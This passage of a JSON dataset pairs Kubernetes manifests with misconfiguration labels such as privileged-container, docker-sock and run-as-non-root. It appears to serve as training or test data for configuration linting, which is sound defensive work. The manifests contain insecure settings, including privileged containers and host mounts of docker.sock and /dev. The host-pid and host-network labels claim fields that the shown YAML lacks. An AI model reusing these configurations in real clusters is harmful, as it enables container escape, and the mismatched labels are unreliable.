    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kpack-controller\n  namespace: kpack\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kpack-controller\n  template:\n    metadata:\n      labels:\n        app: kpack-controller\n        version: 0.0.6-rc.45\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: gcr.io/cf-build-service-public/kpack/controller@sha256:febeb4b845a3d908c8a77dcbefb4bb30345a43d9b66ad63f7fa78eb54e584b5d\n        env:\n        - name: BUILD_INIT_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/build-init@sha256:5205844aefba7c91803198ef81da9134031f637d605d293dfe4531c622aa42b1\n        - name: REBASE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/rebase@sha256:fbc2a6bf5c535b44e6da45cd13de3b09880b0e8ccf7d5022f568065eccf5efee\n        - name: COMPLETION_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/completion@sha256:35ea89f438450d6f322af0b24a1ca48031788c98e15c0d3c45aa26999bc1e34b\n        - name: LIFECYCLE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/lifecycle@sha256:31a73391d4bf8b919fc2a15455ba0844fed109f935c43cd3e97e0d1e16662d74\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"controller\" is not set to runAsNonRoot"
  },
  {
    "id": "9803",
    "manifest_path": "data/manifests/the_stack_sample/sample_3766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kpack-controller\n  namespace: kpack\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kpack-controller\n  template:\n    metadata:\n      labels:\n        app: kpack-controller\n        version: 0.0.6-rc.45\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: gcr.io/cf-build-service-public/kpack/controller@sha256:febeb4b845a3d908c8a77dcbefb4bb30345a43d9b66ad63f7fa78eb54e584b5d\n        env:\n        - name: BUILD_INIT_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/build-init@sha256:5205844aefba7c91803198ef81da9134031f637d605d293dfe4531c622aa42b1\n        - name: REBASE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/rebase@sha256:fbc2a6bf5c535b44e6da45cd13de3b09880b0e8ccf7d5022f568065eccf5efee\n        - name: COMPLETION_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/completion@sha256:35ea89f438450d6f322af0b24a1ca48031788c98e15c0d3c45aa26999bc1e34b\n        - name: LIFECYCLE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/lifecycle@sha256:31a73391d4bf8b919fc2a15455ba0844fed109f935c43cd3e97e0d1e16662d74\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"controller\" has cpu request 0"
  },
  {
    "id": "9804",
    "manifest_path": "data/manifests/the_stack_sample/sample_3766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kpack-controller\n  namespace: kpack\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kpack-controller\n  template:\n    metadata:\n      labels:\n        app: kpack-controller\n        version: 0.0.6-rc.45\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: gcr.io/cf-build-service-public/kpack/controller@sha256:febeb4b845a3d908c8a77dcbefb4bb30345a43d9b66ad63f7fa78eb54e584b5d\n        env:\n        - name: BUILD_INIT_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/build-init@sha256:5205844aefba7c91803198ef81da9134031f637d605d293dfe4531c622aa42b1\n        - name: REBASE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/rebase@sha256:fbc2a6bf5c535b44e6da45cd13de3b09880b0e8ccf7d5022f568065eccf5efee\n        - name: COMPLETION_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/completion@sha256:35ea89f438450d6f322af0b24a1ca48031788c98e15c0d3c45aa26999bc1e34b\n        - name: LIFECYCLE_IMAGE\n          value: gcr.io/cf-build-service-public/kpack/lifecycle@sha256:31a73391d4bf8b919fc2a15455ba0844fed109f935c43cd3e97e0d1e16662d74\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"controller\" has memory limit 0"
  },
  {
    "id": "9805",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "docker-sock",
    "violation_text": "host system directory \"/var/run/docker.sock\" is mounted on container \"debug-agent\""
  },
  {
    "id": "9806",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "9807",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"debug-agent\" is using an invalid container image, \"aylei/debug-agent:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9808",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"debug-agent\" does not have a read-only root file system"
  },
  {
    "id": "9809",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"debug-agent\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "9810",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"debug-agent\" is privileged"
  },
  {
    "id": "9811",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"debug-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "9812",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"debug-agent\" has cpu request 0"
  },
  {
    "id": "9813",
    "manifest_path": "data/manifests/the_stack_sample/sample_3768.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - name: debug-agent\n        image: aylei/debug-agent:latest\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: cgroup\n          mountPath: /sys/fs/cgroup\n        - name: lxcfs\n          mountPath: /var/lib/lxc\n          mountPropagation: Bidirectional\n        - name: docker\n          mountPath: /var/run/docker.sock\n        - name: runcontainerd\n          mountPath: /run/containerd\n        - name: runrunc\n          mountPath: /run/runc\n        - name: vardata\n          mountPath: /var/data\n      volumes:\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n      - name: lxcfs\n        hostPath:\n          path: /var/lib/lxc\n          type: DirectoryOrCreate\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n      - name: vardata\n        hostPath:\n          path: /var/data\n      - name: runcontainerd\n        hostPath:\n          path: /run/containerd\n      - name: runrunc\n        hostPath:\n          path: /run/runc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"debug-agent\" has memory limit 0"
  },
  {
    "id": "9814",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "9815",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ceph-controller-pod\" is using an invalid container image, \"cdxvirt/ceph-daemon:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9816",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ceph-controller-pod\" does not have a read-only root file system"
  },
  {
    "id": "9817",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"ceph-controller-pod\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "9818",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"ceph-controller-pod\" is privileged"
  },
  {
    "id": "9819",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ceph-controller-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "9820",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/dev\" is mounted on container \"ceph-controller-pod\""
  },
  {
    "id": "9821",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: ceph-controller\n  namespace: ceph\nspec:\n  template:\n    metadata:\n      labels:\n        name: ceph-controller\n    spec:\n      volumes:\n      - name: localtime\n        hostPath:\n          path: /etc/localtime\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: lib-modules\n        hostPath:\n          path: /lib/modules\n      containers:\n      - name: ceph-controller-pod\n        image: cdxvirt/ceph-daemon:latest\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          privileged: true\n        args:\n        - cdx_controller\n        env:\n        - name: CEPH_PUBLIC_NETWORK\n          value: 192.168.32.0/23\n        - name: CEPH_CLUSTER_NETWORK\n          value: 192.168.32.0/23\n        - name: K8S_NETWORK\n          value: 192.168.32.0/23\n        - name: CDX_ENV\n          value: 'true'\n        volumeMounts:\n        - name: localtime\n          mountPath: /etc/localtime\n        - name: dev\n          mountPath: /dev\n        - name: lib-modules\n          mountPath: /lib/modules\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ceph-controller-pod\" has cpu request 0"
  },
  {
    "id": "9822",
    "manifest_path": "data/manifests/the_stack_sample/sample_3769.yaml",
